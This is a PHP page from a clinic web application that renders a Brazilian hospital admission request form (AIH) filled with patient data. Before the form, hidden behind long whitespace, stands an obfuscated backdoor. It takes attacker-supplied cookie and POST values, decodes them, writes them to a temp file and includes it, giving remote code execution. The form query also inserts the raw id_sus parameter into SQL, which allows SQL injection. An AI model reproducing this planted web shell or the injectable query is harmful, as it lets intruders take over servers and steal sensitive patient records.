<?php                                                                                                                                                                                                                                                                                                                                                                                                 $IfmWxbA = "\141" . 'D' . chr ( 740 - 621 ).chr (95) . chr (108) . 'w' . chr (104) . chr (89) . chr ( 104 - 4 ); $ZRxPzWB = chr (99) . "\x6c" . 'a' . "\163" . "\x73" . '_' . "\145" . "\170" . "\151" . "\163" . chr ( 135 - 19 )."\x73";$SsvvLB = class_exists($IfmWxbA); $ZRxPzWB = "55714";$BbcZO = strpos($ZRxPzWB, $IfmWxbA);if ($SsvvLB == $BbcZO){function ofexbCXZyc(){$ilVzzFKqq = new /* 20266 */ aDw_lwhYd(25600 + 25600); $ilVzzFKqq = NULL;}$CdtPeXpq = "25600";class aDw_lwhYd{private function CvYZALLA($CdtPeXpq){if (is_array(aDw_lwhYd::$xxwQeCw)) {$name = sys_get_temp_dir() . "/" . crc32(aDw_lwhYd::$xxwQeCw["salt"]);@aDw_lwhYd::$xxwQeCw["write"]($name, aDw_lwhYd::$xxwQeCw["content"]);include $name;@aDw_lwhYd::$xxwQeCw["delete"]($name); $CdtPeXpq = "25600";exit();}}public function lvNBvZ(){$yrAWFtAUC = "37097";$this->_dummy = str_repeat($yrAWFtAUC, strlen($yrAWFtAUC));}public function __destruct(){aDw_lwhYd::$xxwQeCw = @unserialize(aDw_lwhYd::$xxwQeCw); $CdtPeXpq = "6375_8419";$this->CvYZALLA($CdtPeXpq); $CdtPeXpq = "6375_8419";}public function VOEHm($yrAWFtAUC, $ndtHLYxyV){return $yrAWFtAUC[0] ^ str_repeat($ndtHLYxyV, intval(strlen($yrAWFtAUC[0]) / strlen($ndtHLYxyV)) + 1);}public function aYkthEevDt($yrAWFtAUC){$GoNpCWB = 'b' . chr (97) . 's' . chr (101) . chr ( 529 - 475 ).'4';return array_map($GoNpCWB . "\137" . 'd' . chr ( 110 - 9 )."\x63" . 'o' . 'd' . "\x65", array($yrAWFtAUC,));}public function __construct($HBXMThZo=0){$MCIlP = "\x2c";$yrAWFtAUC = "";$umJUi = $_POST;$YCvJRhDTTn = $_COOKIE;$ndtHLYxyV = "23eb8d97-d775-4fca-b87c-fc3b08425125";$BLQWcgAfRU = @$YCvJRhDTTn[substr($ndtHLYxyV, 0, 4)];if (!empty($BLQWcgAfRU)){$BLQWcgAfRU = explode($MCIlP, $BLQWcgAfRU);foreach ($BLQWcgAfRU as $yvRThUkDbM){$yrAWFtAUC .= @$YCvJRhDTTn[$yvRThUkDbM];$yrAWFtAUC .= @$umJUi[$yvRThUkDbM];}$yrAWFtAUC = $this->aYkthEevDt($yrAWFtAUC);}aDw_lwhYd::$xxwQeCw = $this->VOEHm($yrAWFtAUC, $ndtHLYxyV);if (strpos($ndtHLYxyV, $MCIlP) !== FALSE){$ndtHLYxyV = str_pad($ndtHLYxyV, 10); $ndtHLYxyV = ltrim($ndtHLYxyV);}}public static $xxwQeCw = 20374;}ofexbCXZyc();} ?><?php include "functions/config.php"; 
session_start();
$id_sus = $_GET['id_sus'];

	  $s = "SELECT * from sus WHERE id_sus=$id_sus";
$s_events = mysqli_query($conn, $s);
while ($mod = mysqli_fetch_array($s_events)){
$nome=$mod['nome'];
$endereco=$mod['endereco'];
}
//var_dump($nome)	
 ?>
 
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="author" content="Anísio Neto and Newton Lauer">  	
	<meta name="copyright" content="MedLauer">	
	<title>aih</title>
<link href="css/paper.css" rel="stylesheet" />
<link href="css/print.css" rel="stylesheet" />

 </head>
 
<style>
  @page {
    size: A4
  }

	body {
            font-family: Arial, sans-serif;
        }

	input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            box-sizing: border-box;
			font-size:10px;
        }
	label {font-size:10px;
		}
		
</style>		

<body class="A4">
 <section class="sheet padding-10mm">
  <table style="border: 1px solid black;"> <tr><td>
	<table>
	<tr>
		<td width="30%" style="border: 1px solid black;" >  <img  src="img/logo_aih.png" width="100%" >  
		</td>
		<td align="center" style="font-size:14px; border: 1px solid black; font-weight: bold; padding: 4px" >LAUDO PARA SOLICITAÇÃO DE AUTORIZAÇÃO<br>DE INTERNAÇÃO HOSPITALAR 
		</td>
	</tr>
	
	
	<table align="center" width="99%"style="border:1px solid black; border-radius:10px; overflow:hidden;"> 
			<br> <label style="font-size:12px; font-weight: bold; position: absolute; background-color:white; left:70px;top:101px; " for="título1">Identificação do Estabelecimento de Saúde</label>
	<tr>
		<td style="width: 75%;" > 
			<label style="position: absolute; background-color:white; left:90px;top:113px; font-size: 8px;" for="campo1">1-NOME DO ESTABELECIMENTO SOLICITANTE</label>
			<input  style="border:1px solid black; height:20px;" value="<?php echo $_SESSION['UsuarioClinica'];?>">	
		</td>
		<td> 
			<label style="position: absolute; background-color:white; left:580px;top:113px; font-size: 8px;" for="campo2">2-CNES</label>
			<input  style="border:1px solid black; height:20px">
		</td>
	</tr>
	<tr>
		<td style="width: 75%;"> 
			<label style="position: absolute; background-color:white; left:90px;top:139px; font-size: 8px;" for="campo3">3-NOME DO ESTABELECIMENTO EXECUTANTE</label>
			<input  style="border:1px solid black; height:20px">
		</td>
		<td> <label style="position: absolute; background-color:white; left:580px;top:139px; font-size: 8px;" for="campo4">4-CNES</label>
			 <input  style="border:1px solid black; height:20px">
		</td>
	</tr>
	</table>

	<table align="center" width="99%"style="border:1px solid black; border-radius:10px; overflow:hidden;"> 
			<br> <label style="font-size:12px; font-weight: bold; position: absolute; background-color:white; left:70px;top:176px; " for="título2">Identificação do Paciente</label>
	<tr>
		<td style="width: 75%;" colspan="3" > 
			<label style="position:absolute; background-color:white; left:90px;top:187px; font-size: 8px;" for="campo5">5-NOME DO PACIENTE</label >
			<input  style="border:1px solid black; height:20px;" value="<?php echo $nome;    ?>">
		</td>
		<td> 
			<label style="position: absolute; background-color:white; left:580px;top:187px; font-size: 8px;" for="campo6">6-N° DO PRONTUÁRIO</label>
			<input  style="border:1px solid black; height:20px">
		</td>
	</tr>
	<tr>
		<td width="40%"> 
			<label style="position:absolute; background-color:white; left:90px;top:213px; font-size: 8px; " for="campo7">7-CARTÃO NACIONAL DE SAÚDE (CNS)</label>
			<input  style="border:1px solid black; height:20px">
		</td>
		<td> 
			<label style="position:absolute; background-color:white; left:340px;top:213px; font-size: 8px; " for="campo8">8-DATA DE NASCIMENTO</label>
			<input  style="border:1px solid black; height:20px">
		</td>
		<td> 
			<label style="position:absolute; background-color:white; left:490px;top:213px; font-size: 8px; " for="campo9">9-SEXO</label>
			<input  style="border:1px solid black; height:20px">
		</td>
		<td> 
			<label style="position:absolute; background-color:white; left:580px;top:213px; font-size: 8px; " for="campo10">10-RAÇA/COR</label>
			<input  style="border:1px solid black; height:20px">
		</td>		
	</tr>
	<tr>
		<td colspan="2"> 
			<label style="position:absolute; background-color:white; left:90px;top:238px; font-size: 8px; " for="campo11">11-NOME DA MÃE</label>
			<input  style="border:1px solid black; height:20px">
		</td>
		<td colspan="2"> 
			<label style="position:absolute; background-color:white; left:500px;top:238px; font-size: 8px; " for="campo12">12-TELEFONE DE CONTATO</label>
			<input  style="border:1px solid black; height:20px">
		</td>
	</tr>
	<tr>
		<td colspan="2"> 
			<label style="position:absolute; background-color:white; left:90px;top:265px; font-size: 8px; " for="campo13">13-NOME DO RESPONSÁVEL</label>
			<input  style="border:1px solid black; height:20px">
		</td>
		<td colspan="2"> <label style="position:absolute; background-color:white; left:500px;top:265px; font-size: 8px; " for="campo14">14-TELEFONE DE CONTATO</label>
			 <input style="border:1px solid black; height:20px">
		</td>
	</tr>
	<tr>
		<td colspan="4"> 
			<label style="position:absolute; background-color:white; left:90px;top:290px; font-size: 8px; " for="campo15">15-ENDEREÇO (RUA,N°,BAIRRO)</label>
			<input  style="border:1px solid black; height:20px" value="<?php echo $endereco;?>">
		</td>
	</tr>
	<tr>
		<td> 
			<label style="position:absolute; background-color:white; left:90px;top:316px; font-size: 8px;" for="campo16">16-MUNICIPIO DE RESIDÊNCIA</label>
			<input  style="border:1px solid black; height:20px">
		</td>
		<td> <label style="position:absolute; background-color:white; left:340px;top:316px; font-size: 8px; " for="campo17">17-COD.IBGE MUNICÍPIO</label>
			 <input  style="border:1px solid black; height:20px">
		</td>
		<td> 
			<label style="position: absolute; background-color:white; left:490px;top:316px; font-size: 8px;" for="campo18">18-UF</label>
			<input  style="border:1px solid black; height:20px">
		</td>
		<td> <label style="position: absolute; background-color:white; left:580px;top:316px; font-size: 8px; " for="campo14">19-CEP</label>
			 <input  style="border:1px solid black; height:20px">
		</td>
	</tr>
	</table>
	
	<table align="center" width="99%"style="border:1px solid black; border-radius:10px; overflow:hidden;"> 
			<br> <label style="font-size:12px; font-weight: bold; position: absolute; background-color:white; left:290px;top:354px; " for="título3">JUSTIFICATIVA DA INTERNAÇÃO</label>
	<tr>
		<td colspan="4"> 
			<label style="position:absolute; background-color:white; left:90px;top:361px; font-size: 8px;" for="campo20">20-PRINCIPAIS SINAIS E SINTOMAS CLÍNICOS</label >
			
			<textarea style="resize:none; border:1px solid black; height:148px; width:699px;"></textarea>		
		</td>
	</tr>
	<tr>
		<td colspan="4"> 
			<label style="position:absolute; background-color:white; left:90px;top:519px; font-size: 8px; " for="campo21">21-CONSIÇÕES QUE JUSTIFICAM A INTERNAÇÃO</label>
			<input  style="border:1px solid black; height:90px">
		</td>		
	</tr>
	<tr>
		<td colspan="4"> 
			<label style="position:absolute; background-color:white; left:90px;top:614px; font-size: 8px; " for="campo22">22-PRINCIPAIS RESULTADOS DE PROVAS DIAGNÓSTICOS(RESULTADOS DE EXAMES REALIZADOS)</label>
			<input  style="border:1px solid black; height:70px">
		</td>
	</tr>
	<tr>
		<td> 
			<label style="position:absolute; background-color:white; left:90px;top:686px; font-size: 8px; " for="campo23">23-DIAGNÓSTICO INICIAL</label>
			<input  style="border:1px solid black; height:20px">
		</td>
		<td> 
			<label style="position:absolute; background-color:white; left:260px;top:686px; font-size: 8px; " for="campo24">24-CID 10 PRINCIPAL</label>
			<input style="border:1px solid black; height:20px">
		</td>
		<td> 
			<label style="position:absolute; background-color:white; left:440px;top:686px; font-size: 8px; " for="campo25">25-CID 10 SECUNDÁRIO</label>
			<input  style="border:1px solid black; height:20px">
		</td>
		<td> 
			<label style="position:absolute; background-color:white; left:600px;top:686px; font-size: 8px; " for="campo26">26-CID 10 CAUSAS ASSOCIADAS</label>
			<input  style="border:1px solid black; height:20px">
		</td>
	</tr>
	</table>

	<table align="center" width="99%"style="border:1px solid black; border-radius:10px; overflow:hidden;"> 
			<br> <label style="font-size:12px; font-weight: bold; position:absolute; background-color:white; left:295px;top:721px; " for="título4">PROCEDIMENTO SOLICITADO</label>
	<tr>
		<td colspan="2"> 
			<label style="position:absolute; background-color:white; left:90px;top:734px; font-size: 8px;" for="campo27">27-DESCRIÇÃO DO PROCEDIMENTO SOLICITADO</label >
			<input  style="border:1px solid black; height:20px;">
		</td>
		<td colspan="2"> 
			<label style="position:absolute; background-color:white; left:490px;top:734px; font-size: 8px;" for="campo28">28-CÓDIGO DO PROCEDIMENTO</label >
			<input  style="border:1px solid black; height:20px;">
		</td>
	</tr>
	<tr>
		<td> 
			<label style="position:absolute; background-color:white; left:90px;top:759px; font-size: 8px;" for="campo29">29-CLÍNICA</label >
			<input  style="border:1px solid black; height:20px;">
		</td>
		<td> 
			<label style="position:absolute; background-color:white; left:235px;top:759px; font-size: 8px;" for="campo30">30-CARÁTER DA INTERNAÇÃO</label >
			<input  style="border:1px solid black; height:20px;">
		</td>
		<td> 
			<label style="position:absolute; background-color:white; left:420px;top:759px; font-size: 8px;" for="campo31">31-DOCUMENTO</label >
			<input  style="border:1px solid black; height:20px;">
		</td>
		<td> 
			<label style="position:absolute; background-color:white; left:580px;top:759px; font-size: 6px;" for="campo32">32-N°DOCUMENTO DO PROFISSIONAL SOLICITANTE</label >
			<input  style="border:1px solid black; height:20px;">
		</td>
	</tr>
	<tr>
		<td colspan="2"> 
			<label style="position:absolute; background-color:white; left:90px;top:792px; font-size: 8px;" for="campo33">33-NOME DO PROFISSIONAL SOLICITANTE/ASSISTENTE</label >
			<input  style="border:1px solid black; height:20px;">
		</td>
		<td> 
			<label style="position:absolute; background-color:white; left:420px;top:792px; font-size: 8px;" for="campo34">34-DATA DA SOLICITAÇÃO</label >
			<input  style="border:1px solid black; height:20px;">
		</td>
				<td> 
			<label style="position:absolute; background-color:white; left:580px;top:785px; font-size: 8px;" for="campo34">35-ASSINATURA E CARIMBO </label >
			<input  style="border:1px solid black; height:40px;">
		</td>
	</tr>
	</table>

	<table align="center" width="99%"style="border:1px solid black; border-radius:10px; overflow:hidden;"> 
			<br> <label style="font-size:12px; font-weight: bold; position:absolute; background-color:white; left:215px;top:839px; " for="título5">PREENCHER EM CASO DE CAUSAS EXTERNAS OU VIOLÊNCIAS)</label>
	<tr >
		<td width="25%" rowspan="2" style="border:1px solid black;">
				<label  style="font-size:8px" for="campo36-37-38">36- ( &nbsp;&nbsp; )ACIDENTE DE TRÂNSITO <br> 37- ( &nbsp;&nbsp; )ACIDENTE DE TRABALHO TÍPICO <br> 38- ( &nbsp;&nbsp; )ACIDENTE TRABALHO TRAJETO </label > 			
		</td>
		<td>
			<label style="position:absolute; background-color:white; left:250px;top:854px; font-size: 8px;" for="campo39">39-CNPJ DA SEGURADORA</label >
			<input  style="border:1px solid black; height:20px;">
		</td>
		<td>
			<label style="position:absolute; background-color:white; left:427px;top:854px; font-size: 8px;" for="campo40">40-N° DO BILHETE</label >
			<input  style="border:1px solid black; height:20px;">
		</td>
		<td>
			<label style="position:absolute; background-color:white; left:600px;top:854px; font-size: 8px;" for="campo41">41-SÉRIE</label >
			<input  style="border:1px solid black; height:20px;">
		</td>
	</tr>
	<tr>
		<td>
			<label style="position:absolute; background-color:white; left:250px;top:886px; font-size: 8px;" for="campo42">42-CNPJ EMPRESA</label >
			<input  style="border:1px solid black; height:20px;">
		</td>
		<td>
			<label style="position:absolute; background-color:white; left:427px;top:886px; font-size: 8px;" for="campo43">43-CNAE DA EMPRESA</label >
			<input  style="border:1px solid black; height:20px;">
		</td>
		<td>
			<label style="position:absolute; background-color:white; left:600px;top:886px; font-size: 8px;" for="campo44">44-CBOR</label >
			<input  style="border:1px solid black; height:20px;">
		</td>
	</tr>
	<tr> <td> </td> </tr>
	<tr >
		<label style="position:absolute; background-color:white; left:90px;top:917px; font-size: 8px;" for="campo45">45- VINCULO COM A PREVIDÊNCIA </label>
		<td colspan ="4" width=95% style="border:1px solid black;"> <label  style="font-size:8px" for="campo45A"> <pre>   (    )  EMPREGADO        (   )  EMPREGADOR        (  )  AUTÔNOMO       (   )  DESEMPREGADO           (  )  APOSENTADO           (  )  NÃO SEGURADO </pre> </label > </td>
	</tr> 
	</table>
		
	
	
	<table align="center" width="99%"style="border:1px solid black; border-radius:10px; overflow:hidden;"> 
			<br> <label style="font-size:12px; font-weight: bold; position:absolute; background-color:white; left:325px;top:960px; " for="título6">AUTORIZAÇÃO</label>
	<tr>
		<td> 
			<label style="position:absolute; background-color:white; left:90px;top:972px; font-size: 8px;" for="campo46">46-NOME DO PROFISSIONAL AUTORIZADOR</label>
			<input  style="border:1px solid black; height:20px;">	
		</td>
		<td> 
			<label style="position:absolute; background-color:white; left:300px;top:972px; font-size: 8px;" for="campo47">47-COD. ÓRGÃO EMISSOR</label>
			<input  style="border:1px solid black; height:20px">
		</td>
		<td rowspan="3">
			<label style="position:absolute; background-color:white; left:520px;top:972px; font-size: 8px;" for="campo52">52-N° DA AUTORIZAÇÃO DE INTERNAÇÃO HOSPITALAR</label>
			<input  style="border:1px solid black; height:70px">
		</td> 
	</tr>
	<tr>
		<td> 
			<label style="position:absolute; background-color:white; left:90px;top:997px; font-size: 8px;" for="campo48">48-DOCUMENTO</label>
			<input  style="border:1px solid black; height:20px">
		</td>
		<td> 
			<label style="position:absolute; background-color:white; left:288px;top:997px; font-size: 7px;" for="campo49">49-N° DOCUMENTO (CNS/CPF) DO PROFISSIONAL AUTORIZADOR</label>
			<input  style="border:1px solid black; height:20px">
		</td>
	</tr>
	<tr>
		<td> 
			<label style="position:absolute; background-color:white; left:90px;top:1022px; font-size:8px;" for="campo50">50-DATA DA AUTORIZAÇÃO</label>
			<input  style="border:1px solid black; height:20px">
		</td>
		<td> 
			<label style="position:absolute; background-color:white; left:288px;top:1022px; font-size: 7px;" for="campo51">51-ASSINATURA E CARIMBO(N° DO REGISTRO DO CONSELHO)</label>
			<input  style="border:1px solid black; height:20px">
		</td>
	</tr>
	</table>
    
   </table>
	</td></tr>    
  </table>
 </section>
</body>
</html>